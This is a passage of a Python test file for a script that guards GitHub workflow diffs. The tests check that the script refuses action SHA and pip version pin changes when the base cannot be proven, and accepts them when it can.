    # across the ports of this script and confirmed by fuzzing against PyYAML.
    result = _check_in_repo(
        tmp_path,
        SEQUENCE_ITEM_SPLIT.format(item=item, sha=SHA),
        SEQUENCE_ITEM_SPLIT.format(item=item, sha=OTHER_SHA),
    )
    assert result.returncode == 1, result.stdout


def test_refuses_a_uses_line_under_an_opener_after_a_comment(tmp_path):
    # A comment ending in `: |` is not an opener. Read as one, it swallowed
    # the real `run: &body |-` below it, found by fuzzing against PyYAML.
    result = _check_in_repo(
        tmp_path,
        COMMENT_BEFORE_OPENER.format(sha=SHA),
        COMMENT_BEFORE_OPENER.format(sha=OTHER_SHA),
    )
    assert result.returncode == 1, result.stdout


def test_refuses_a_nested_run_line_with_no_base_to_read():
    # With no `index` line the base cannot be proven, and a workflow line
    # is then never graded as a pin: the documented gap of judging from
    # context (a `uses:` under an `if` inside `run: |`) cannot recur.
    before = NESTED_IN_RUN.format(sha=SHA)
    after = NESTED_IN_RUN.format(sha=OTHER_SHA)
    path = ".github/workflows/scan.yml"
    body = "".join(
        difflib.unified_diff(
            [line + "\n" for line in before.splitlines()],
            [line + "\n" for line in after.splitlines()],
            f"a/{path}",
            f"b/{path}",
        )
    )
    diff = f"diff --git a/{path} b/{path}\n{body}"
    assert "uses: fake/action" in diff
    assert _check(diff).returncode == 1


def test_refuses_a_nested_run_line_when_main_has_moved_the_file(tmp_path):
    result = _check_in_repo(
        tmp_path,
        NESTED_IN_RUN.format(sha=SHA),
        NESTED_IN_RUN.format(sha=OTHER_SHA),
        base=NESTED_IN_RUN.format(sha=SHA) + "# moved on main\n",
    )
    assert result.returncode == 1, result.stdout


PIP_IN_RUN = (
    "jobs:\n"
    "  scan:\n"
    "    runs-on: ubuntu-latest\n"
    "    steps:\n"
    "      - name: Install\n"
    "        run: |\n"
    "          pip install checkov=={version}\n"
)


def test_refuses_a_pip_pin_in_a_workflow_with_no_base_to_read():
    # A pip pin in a `run:` step is a pin no block scalar check guards, so
    # withholding pin normalization alone would still grade it. A workflow
    # whose base cannot be proven is refused as a whole instead.
    path = ".github/workflows/scan.yml"
    body = "".join(
        difflib.unified_diff(
            [line + "\n" for line in PIP_IN_RUN.format(version="3.3.2").splitlines()],
            [line + "\n" for line in PIP_IN_RUN.format(version="3.3.11").splitlines()],
            f"a/{path}",
            f"b/{path}",
        )
    )
    result = _check(f"diff --git a/{path} b/{path}\n{body}")
    assert result.returncode == 1
    assert "could not be proven" in result.stdout


def test_refuses_a_pip_pin_in_a_workflow_when_main_has_moved_it(tmp_path):
    result = _check_in_repo(
        tmp_path,
        PIP_IN_RUN.format(version="3.3.2"),
        PIP_IN_RUN.format(version="3.3.11"),
        base=PIP_IN_RUN.format(version="3.3.2") + "# moved on main\n",
    )
    assert result.returncode == 1
    assert "could not be proven" in result.stdout


def test_accepts_a_pip_pin_in_a_workflow_with_a_proven_base(tmp_path):
    result = _check_in_repo(
        tmp_path,
        PIP_IN_RUN.format(version="3.3.2"),
        PIP_IN_RUN.format(version="3.3.11"),
    )
    assert result.returncode == 0, result.stdout
